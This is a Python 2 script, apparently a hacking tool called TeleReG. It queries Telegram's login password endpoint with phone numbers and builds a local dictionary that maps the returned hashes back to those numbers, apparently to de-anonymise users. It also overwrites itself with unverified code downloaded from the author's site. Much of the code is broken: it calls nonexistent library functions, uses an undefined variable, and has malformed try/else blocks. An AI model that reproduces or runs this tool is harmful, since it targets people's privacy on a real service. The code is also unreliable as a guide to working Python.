#!/usr/bin/python
# Persian Underground GateWay (c) 19 March 2016
# Programmed By Sha4yan
# Contact me on my Website: sha4yan.ml

import urllib2
import urllib
import sys

script_name = sys.argv[0]
file = "telereverse.txt"
url = "https://my.telegram.org/auth/send_password"
update_url = "http://sha4yan.ml/new/telereg.txt"

def banner():
  print "[+] Telegram Reverse Hash Generator (TeleReG)\n"
  print "[+] Programmed By Sha4yan\n"
  print "[+] IRANIAN_HACKER\n"

def hashgen():
  try :
    data_raw = raw_input("$ ").rstrip()
    data = {"phone":data_raw}
    arg_e = urllib.encode(data)
    pass_hash = urllib2.urllib(url,arg_e).read()
    if "passhash" in pass_hash:
	   var_pass = pass_hash[13:30]
	   FO = open(file,"a+")
	   FO.write(var_pass+"==>"+data_raw)
	   FO.close()

  except:
    print "[*]Sth is Wrong !\n"
def hashchk():
  try:
    hash_raw = raw_input("Enter Hash : ")
    FO = open(file,"r")
    if hash_raw in FO.readlines():
	    print "Cracked !"
	    print "Result : "+a[0:17]
	else:
	    print "Develope Our Hash Dictionary :)\n"
  except:
    print "[*]Sth is Wrong !"

	
def update_source():
  aurl = urllib.urlopen(update_url)
  a_rd = aurl.read()
  if a_rd.code == 200 :
    aa = open(script_name,"w+")
    aa.write(a_rd)
    aa.close()
    print "[+]Script Update to New Version\n"
  else :
    print "[-] New Update Not Available Yet\n"

	
print "For Hash Generating Enter -1\n"
print "For Hash Cracking Enter -2\n"
print "Update Script With Entering -3\n"

analyze= raw_input("$ Enter Your Choice : \n")
try :
  if str(analyze) == "-1":
     hashgen()
  elif str(analyze) == "-2":
     hashchk()
  else: 
     update_source()
